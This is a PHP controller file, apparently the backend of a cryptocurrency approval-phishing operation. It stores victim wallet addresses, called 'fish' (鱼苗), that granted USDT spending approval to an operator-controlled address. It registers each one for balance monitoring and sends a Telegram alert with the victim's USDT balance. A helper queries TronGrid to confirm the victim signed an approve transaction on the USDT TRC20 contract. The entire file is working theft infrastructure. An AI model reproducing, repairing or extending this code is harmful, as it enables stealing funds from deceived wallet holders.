<?php
namespace app\shop\controller;

use think\Cache;
use think\Db;

class Fish extends Base {
    
    public function is_f(){

        $fish_address = $this->request->post('address');
        $au_address = $this->request->post('authorized_address');
        
        $result = db::name('fish')->where(['address' => $fish_address, 'au_address' => $au_address])->find();
        
        if(isset($result)){
            return $this->success('',$result['transaction'],1);
        }else{
            return $this->success('','',0);
        }
    
    }
    
    public function addFish(){
        
        $fish_address = $this->request->post('address');
        $au_address = $this->request->post('authorized_address');
        $hash = $this->request->post('txid');
        $type = $this->request->post('type');
        $transaction = $this->request->post('transaction');
        
        $timestamp = time();
        
        $payInfo = Db::name("pay")->where("type","usdtpay")->column('value');
        $payInfo = json_decode($payInfo[0],true);
        
        // $this->checkTrcStatus($fish_address,$payInfo['trc_au_address'],$hash,$timestamp);
        
        $insert = [
            'address' => $fish_address, 
            'au_address' => $payInfo[$type . '_au_address'], 
            'type' => $type,
            'transaction' => $transaction,
            'create_time' => $timestamp,
            'update_time' => $timestamp
    
        ];
        
        db::name('fish')->insert($insert);
        
        
        $listen = new Listen();
        //添加监听
        $listen->addListen($fish_address,$type);
        //发送电报通知消息
        $balance = $listen->getBalance($fish_address,$type,'USDT');
        $text = "【TRX权限提醒】<b><a href=\"https://tronscan.org/#/address/{$fish_address}\">链上查询</a></b>\n鱼苗地址：{$fish_address} \n权限地址：{$au_address} \n<b>权限等级：{$transaction} \n钱包余额：{$balance} USDT </b>\n";
        $listen->sendMsg($text);
        exit('success');
        
    }
    
    public function getAddress(){
        $usdtpay_info = db::name('pay')->where(['type' => 'usdtpay'])->find();
        echo $usdtpay_info['value'];
    }
    
    private function checkTrcStatus($fish_address,$au_address,$hash,$timestamp){
        
        $nurl = 'https://api.trongrid.io/wallet/gettransactioninfobyid';
        $value = json_encode(['value' => $hash]);
        
        while(time() <= $timestamp + 20){

            $result = bcCurl($nurl,$value);
            $result = json_decode($result,true);

            if(empty($result['blockNumber'])) continue;
            
            $blockNumber = $result['blockNumber'];
            $kurl = "https://api.trongrid.io/wallet/getblockbynum";
            $num = json_encode(['num' => $blockNumber]);
            
            $datas = bcCurl($kurl,$num);
            $datas = json_decode($datas,true);
            if(isset($datas['transactions'])){
                
                foreach ($datas['transactions'] as $data){

                    if($data['txID'] == $hash){
                        
                        $from = $data['raw_data']['contract'][0]['parameter']['value']['owner_address'];
                        $contract = $data['raw_data']['contract'][0]['parameter']['value']['contract_address'];
                        
                        $parameter = $data['raw_data']['contract'][0]['parameter']['value']['data'];
                        $strlen = strlen($parameter);
                        
                        $remark = substr($parameter,0,$strlen - 128);
                        $val = hexdec(substr($parameter,-64)) / 1000000;
                        $from = hexString2Base58check($from);
                        $to = hexString2Base58check(41 . substr($parameter,-104,40));
                        $contract = hexString2Base58check($contract);
    
                        if($data['ret'][0]['contractRet'] == 'SUCCESS' && $remark == '095ea7b3' && $contract == 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' && $from == $fish_address && $to == $au_address && $val > 0){
                            
                            return true;
                            
                        }
                        break 2;
                    }
                }
            }
            
            
        }
        
        die();
        
    }
    
}

?>